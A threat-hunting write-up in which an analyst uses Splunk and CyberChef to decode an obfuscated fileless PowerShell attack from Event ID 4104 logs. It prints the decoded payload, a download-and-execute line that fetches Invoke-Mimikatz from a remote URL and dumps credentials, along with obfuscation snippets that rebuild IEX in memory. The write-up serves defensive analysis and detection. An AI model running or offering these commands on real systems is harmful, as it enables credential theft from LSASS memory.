# 🔎 Threat Hunting & Malware De-obfuscation with Splunk
### Investigating a Fileless PowerShell Mimikatz Attack

## 📌 Overview

In this project, I investigated a sophisticated **fileless PowerShell attack** using **Splunk Enterprise** and **CyberChef**. Acting as a SOC Analyst, I analyzed Windows PowerShell Script Block Logging (Event ID 4104) to uncover a heavily obfuscated malware payload designed to evade traditional antivirus and endpoint detection systems.

The investigation involved reconstructing fragmented PowerShell logs, decoding multiple layers of obfuscation, and identifying an in-memory credential dumping attack leveraging **Invoke-Mimikatz**.

---

# 🎯 Objectives

- Analyze Windows Event ID 4104 logs in Splunk
- Reconstruct fragmented PowerShell Script Blocks
- Identify Indicators of Compromise (IOCs)
- Reverse engineer an obfuscated PowerShell payload
- Reveal attacker objectives and malware behavior

---

# 🛠️ Technologies Used

- Splunk Enterprise
- CyberChef
- Kali Linux
- Windows PowerShell
- Windows Event ID 4104
- PowerShell Script Block Logging
- Threat Hunting
- Incident Response
- Malware Analysis

---

# 🏗️ Attack Scenario

A suspicious workstation generated an alert after executing an unknown PowerShell command.

A PowerShell operational log (`powershell_malicious.xml`) was ingested into Splunk for investigation.

My objectives were to:

- Investigate suspicious PowerShell activity
- Reconstruct fragmented Script Block logs
- Identify attacker obfuscation techniques
- Decode the malicious payload
- Determine attacker objectives

---

# 🔍 Investigation Workflow

## Step 1 — Inspecting Imported Event Data

The investigation began by reviewing the imported Event ID 4104 logs.

```spl
source="powershell_malicious.xml" "ScriptBlockText"
```

The initial search revealed heavily obfuscated PowerShell containing randomized casing, dynamic variables, and encoded character arrays.

---

## Step 2 — Understanding Event Fragmentation

Windows had automatically split the large PowerShell script across multiple Script Block events.

Additionally, Splunk displayed those events in reverse chronological order, making the execution wrapper appear before the actual payload.

---

## Step 3 — Extracting the Complete Raw Event

Instead of relying on default fields, I used Splunk's internal `_raw` field to recover the complete event contents.

```spl
source="powershell_malicious.xml"
| table _time _raw
```

This exposed the complete PowerShell execution chain.

---

## Step 4 — Locating the Encoded Payload

Once the full event was reconstructed, I isolated the massive decimal character array responsible for generating the malicious PowerShell command.

Example:

```powershell
73,69,88,32,40,78,101,119...
```

---

## Step 5 — De-obfuscating the Malware

The decimal array was copied into CyberChef.

Recipe:

- From Decimal
- Delimiter: Comma

CyberChef successfully decoded the payload into readable PowerShell.

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');
Invoke-Mimikatz -DumpCreds
```

---

# 🔐 Obfuscation Techniques

### Mixed Case Randomization

```powershell
FOReacH-ObJect
-JoiN
-spLiT
```

---

### Character-Length Cipher

```powershell
$_.Length - 1
```

The malware dynamically calculated ASCII values rather than storing them directly.

---

### Dynamic Invoke-Expression Reconstruction

```powershell
.(''.IndexOf.ToString()[106,482,184]-join'')
```

The malware rebuilt the `Invoke-Expression (IEX)` command entirely in memory.

---

# 🚨 Indicators of Compromise

| Indicator | Description |
|-----------|-------------|
| Invoke-Mimikatz | Credential dumping utility |
| PowerSploit | Offensive PowerShell framework |
| Net.WebClient | Downloads payload directly into memory |
| raw.githubusercontent.com | Remote payload delivery |
| Invoke-Mimikatz -DumpCreds | Dumps credentials from LSASS |

---

# 🎯 Key Findings

- Investigated Windows Event ID 4104 Script Block logs
- Reconstructed fragmented PowerShell execution
- Bypassed Splunk event truncation using `_raw`
- Decoded multiple layers of PowerShell obfuscation
- Identified a fileless malware execution chain
- Confirmed remote retrieval of Invoke-Mimikatz
- Determined attacker intent was credential theft from LSASS memory

---

# 📚 Skills Demonstrated

- Splunk SPL
- Threat Hunting
- Incident Response
- Malware Analysis
- Windows Event Log Analysis
- PowerShell Analysis
- CyberChef
- Threat Intelligence
- IOC Identification
- Log Analysis

---

# ⚠️ Challenges

One of the primary challenges was understanding why the malicious PowerShell appeared incomplete.

Large Script Block logs are automatically fragmented by Windows, while Splunk displays events in reverse chronological order. Recovering the full attack required identifying related events, reconstructing the script, and extracting the original payload before de-obfuscation.

---

# 🛡️ Detection Opportunities

Future improvements could include:

- Sigma rules for suspicious Event ID 4104 activity
- YARA rules targeting PowerShell obfuscation
- Sysmon Event ID 10 monitoring for LSASS access
- PowerShell Constrained Language Mode (CLM)
- AppLocker or WDAC policy enforcement
- Detection rules for suspicious Net.WebClient activity

---

# 📸 Investigation Walkthrough

## 1. Custom Event Breaking During Log Ingestion

![](images/01_splunk_custom_event_breaks.png)

Configured custom event breaking to correctly parse imported PowerShell logs.

---

## 2. Timestamp Parsing Issue

![](images/02_splunk_timestamp_error.png)

Resolved timestamp parsing inconsistencies before beginning log analysis.

---

## 3. Initial Search Results

![](images/04_splunk_search_results.png)

Performed the initial search for suspicious PowerShell Script Block activity.

---

## 4. Identifying the Suspicious Payload

![](images/05_splunk_payload_found.png)

Located the obfuscated PowerShell execution wrapper.

---

## 5. Statistics View Analysis

![](images/07_splunk_statistics_view.png)

Used Splunk statistics to identify relevant events and reduce investigation scope.

---

## 6. Isolating the Malicious Payload

![](images/08_splunk_isolated_payload.png)

Separated the suspicious Script Block from surrounding log data.

---

## 7. Viewing the Complete Raw Event

![](images/10_splunk_expanded_raw.png)

Expanded the `_raw` event to reconstruct the complete PowerShell execution chain.

---

## 8. Preparing for De-obfuscation

![](images/12_cyberchef_ready.png)

Prepared the extracted payload for decoding in CyberChef.

---

## 9. Recovering the Decimal Character Array

![](images/14_splunk_raw_decimal_payload.png)

Located the encoded decimal array used to reconstruct the malicious PowerShell command.

---

## 10. Decoded Malware Payload

![](images/15_cyberchef_decoded_mimikatz.png)

CyberChef decoded the payload, revealing an `Invoke-Mimikatz` credential-dumping attack delivered directly into memory.

---

# 📖 Lessons Learned

This investigation demonstrated how modern fileless malware uses PowerShell obfuscation and legitimate Windows functionality to evade traditional security controls.

Key takeaways include:

- Event ID 4104 provides valuable visibility into PowerShell execution.
- Large PowerShell scripts are automatically fragmented and must be reconstructed.
- Splunk's `_raw` field is critical when investigating truncated events.
- CyberChef is an effective tool for decoding layered PowerShell obfuscation.
- Threat hunting often requires correlating multiple events rather than relying on a single log entry.

---

## 👤 Author

**Yvener Bazile**

Cloud Security • SOC Analyst • Threat Hunting • Azure • Splunk
